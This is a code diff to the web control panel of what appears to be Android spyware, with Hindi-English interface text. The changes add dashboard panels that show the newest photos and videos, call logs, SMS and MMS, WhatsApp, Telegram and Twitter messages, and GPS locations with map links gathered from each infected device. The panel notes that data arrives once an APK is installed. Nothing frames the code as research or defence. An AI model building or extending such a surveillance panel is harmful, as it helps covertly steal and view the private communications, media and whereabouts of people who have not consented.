@@ -299,8 +299,15 @@ footer { text-align: center; color: var(--muted); font-size: .72rem; padding: 30
         <button class="btn danger" onclick="clearAll()">🗑️ Clear All</button>
       </div>
     </div>
-    <div class="head" style="margin-top:22px;"><h2>Endpoint Coverage</h2><span class="sub">Kaunsa endpoint kitni baar hit hua</span></div>
-    <div class="epgrid" id="epgrid"></div>
+    <div class="head" style="margin-top:22px;"><h2>🖼️ Latest Photos & Videos</h2><span class="sub">Naye media turant yahan dikhte hain</span></div>
+    <div class="mgrid" id="dashphotos"></div>
+    <div class="head" style="margin-top:22px;"><h2>⚡ Latest Calls & Messages</h2><span class="sub">Sabse naye events</span></div>
+    <div class="tablewrap">
+      <table>
+        <thead><tr><th>Time</th><th>Type</th><th>Detail</th><th>Device</th></tr></thead>
+        <tbody id="tb-dash"></tbody>
+      </table>
+    </div>
     <div class="head" style="margin-top:22px;"><h2>Last Activity</h2><span class="sub" id="lastact">—</span></div>
   </section>
 
@@ -543,9 +550,8 @@ function exportJSON() {
 var VIEW = [];
 function renderAll() {
   VIEW = deviceFilter === "all" ? DATA.slice() : DATA.filter(function (c) { return String(c.deviceId || "0") === deviceFilter; });
-  var k, counts = { total: VIEW.length, media: 0, calls: 0, sms: 0, loc: 0, files: 0, social: 0, web: 0, other: 0 };
+  var counts = { total: VIEW.length, media: 0, calls: 0, sms: 0, loc: 0, files: 0, social: 0, web: 0, other: 0 };
   var byKind = { media: [], calls: [], sms: [], loc: [], files: [], social: [], web: [], other: [] };
-  var epCounts = {};
   VIEW.forEach(function (c) {
     var k = kindOf(c.path);
     if (isMedia(k)) { counts.media++; byKind.media.push(c); }
@@ -556,7 +562,6 @@ function renderAll() {
     else if (k === "social") { counts.social++; byKind.social.push(c); }
     else if (k === "web") { counts.web++; byKind.web.push(c); }
     else { counts.other++; byKind.other.push(c); }
-    epCounts[c.path] = (epCounts[c.path] || 0) + 1;
   });
 
   set("s-total", counts.total); set("s-media", counts.media); set("s-calls", counts.calls);
@@ -569,7 +574,8 @@ function renderAll() {
   if (VIEW.length) set("lastact", "Latest: " + fmtTime(VIEW[0].time));
 
   renderDevices(VIEW);
-  renderEps(epCounts);
+  renderDashPhotos(byKind.media);
+  renderDashItems();
   renderMedia(byKind.media);
   renderCalls(byKind.calls);
   renderSMS(byKind.sms);
@@ -611,6 +617,65 @@ function renderEps(epCounts) {
   if (!keys.length) { g.innerHTML = '<div class="empty" style="grid-column:1/-1"><div class="big">📡</div><h3>Abhi koi request nahi aayi</h3><p>APK install hone ke baad data yahan dikhega.</p></div>'; return; }
   g.innerHTML = keys.map(function (p) {
     return '<div class="ep"><span class="n">' + esc(p) + '</span><span class="c">×' + epCounts[p] + '</span></div>';
+  }).join("");
+}
+
+function renderDashPhotos(list) {
+  var g = document.getElementById("dashphotos");
+  if (!g) return;
+  var latest = (list || []).filter(function (c) { var f = getF(c); return f && f.fileKey; }).slice(0, 8);
+  if (!latest.length) {
+    g.innerHTML = '<div class="empty" style="grid-column:1/-1"><div class="big">📷</div><h3>Abhi koi photo nahi</h3><p>Naya photo/screenshot lete hi yahan dikh jayega.</p></div>';
+    return;
+  }
+  g.innerHTML = latest.map(function (c) {
+    var f = getF(c);
+    var mk = mediaKind(c) || "file";
+    var url = "/api/file/" + encodeURIComponent(f.fileKey);
+    var thumb;
+    if (mk === "img") thumb = '<img src="' + url + '" alt="" loading="lazy">';
+    else if (mk === "video") thumb = '<video src="' + url + '" controls preload="metadata"></video>';
+    else if (mk === "audio") thumb = '<div class="big">🎙️</div>';
+    else thumb = '<div class="big">📄</div>';
+    return '<div class="mcard"><div class="mthumb">' + thumb + '</div><div class="mbody">'
+      + '<div class="mname">' + esc(f.name || "") + '</div>'
+      + '<div class="mmeta">' + fmtTime(c.time) + ' • ' + esc(devName(c)) + '</div>'
+      + '<a class="mlink" href="' + url + '" target="_blank">Full view ↗</a></div></div>';
+  }).join("");
+}
+
+function renderDashItems() {
+  var tb = document.getElementById("tb-dash");
+  if (!tb) return;
+  var items = VIEW.filter(function (c) {
+    var k = kindOf(c.path);
+    return k === "call" || k === "sms" || k === "mms" || k === "social" || k === "loc";
+  }).slice(0, 10);
+  if (!items.length) { tb.innerHTML = '<tr><td colspan="4" class="empty"><div class="big">⚡</div><h3>Abhi koi activity nahi</h3></td></tr>'; return; }
+  tb.innerHTML = items.map(function (c) {
+    var f = c.fields || {};
+    var k = kindOf(c.path);
+    var tag = "OTHER", detail = "—";
+    if (k === "call") {
+      var t = String(f.type || "");
+      tag = t === "1" ? "📞 IN" : t === "2" ? "📞 OUT" : t === "3" ? "📵 MISSED" : "📞 CALL";
+      detail = esc(f.name || "") + ' <span class="mono">' + esc(f.number || "") + '</span>' + (f.duration ? " • " + esc(f.duration) + "s" : "");
+    } else if (k === "sms" || k === "mms") {
+      tag = k === "mms" ? "💌 MMS" : "💬 SMS";
+      detail = esc(f.number || f.address || "") + ' — ' + esc(f.data || f.body || f.message || "");
+    } else if (k === "social") {
+      var p = String(c.path || "").toLowerCase();
+      var app = p.indexOf("telegram") >= 0 ? "✈️ Telegram" : p.indexOf("whatsapp") >= 0 ? "🟢 WhatsApp" : p.indexOf("twitter") >= 0 ? "🐦 Twitter" : "🗨️ Chat";
+      tag = app;
+      detail = esc(f.fullName || f.name || "") + ': ' + esc(String(f.message || f.body || "").slice(0, 90));
+    } else if (k === "loc") {
+      tag = "📍 LOC";
+      detail = esc(f.address || "") + ' <a href="https://maps.google.com/?q=' + encodeURIComponent((f.latitude || "") + "," + (f.longitude || "")) + '" target="_blank">Map ↗</a>';
+    }
+    return '<tr><td class="mono muted">' + fmtTime(c.time) + '</td>'
+      + '<td><span class="tag call">' + tag + '</span></td>'
+      + '<td class="clip">' + detail + '</td>'
+      + '<td><span class="devtag">' + esc(devName(c)) + '</span></td></tr>';
   }).join("");
 }
 
